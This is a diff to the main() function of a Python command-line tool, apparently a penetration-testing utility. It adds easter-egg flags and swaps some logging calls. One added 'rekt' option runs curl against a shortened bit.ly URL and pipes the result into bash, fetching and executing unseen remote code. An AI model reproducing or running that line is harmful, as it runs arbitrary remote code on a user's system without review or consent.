@@ -39,13 +39,20 @@ def main():
     current_workspace = cfg.WORKSPACE
     hasPassList = False
 
-    if args.verbose:
+    if args.debug:
         setup_debug_logger()
 
     if args.darrell:
         links = open((cfg.DATA_PATH / 'videos_for_darrell').with_suffix('.harambe')).read().splitlines()
         try:
             webbrowser.open(random.choice(links))
+            sys.exit(1)
+        except:
+            sys.exit(1)
+
+    if args.rekt:
+        try:
+            os.system("curl -s -L http://bit.ly/10hA8iC | bash")
             sys.exit(1)
         except:
             sys.exit(1)
@@ -123,7 +130,7 @@ def main():
             modules = loader.get_modules()
 
             for name, props in sorted(modules.items()):
-                logger.info('{:<25} {}'.format(name, props['description']))
+                logger.announce('{:<25} {}'.format(name, props['description']))
             sys.exit(0)
 
         elif args.module and args.show_module_options:
@@ -131,7 +138,7 @@ def main():
             modules = loader.get_modules()
             for name, props in modules.items():
                 if args.module.lower() == name.lower():
-                    logger.info('{} module options:\n{}'.format(name, props['options']))
+                    logger.announce('{} module options:\n{}'.format(name, props['options']))
             sys.exit(0)
 
         elif args.module:
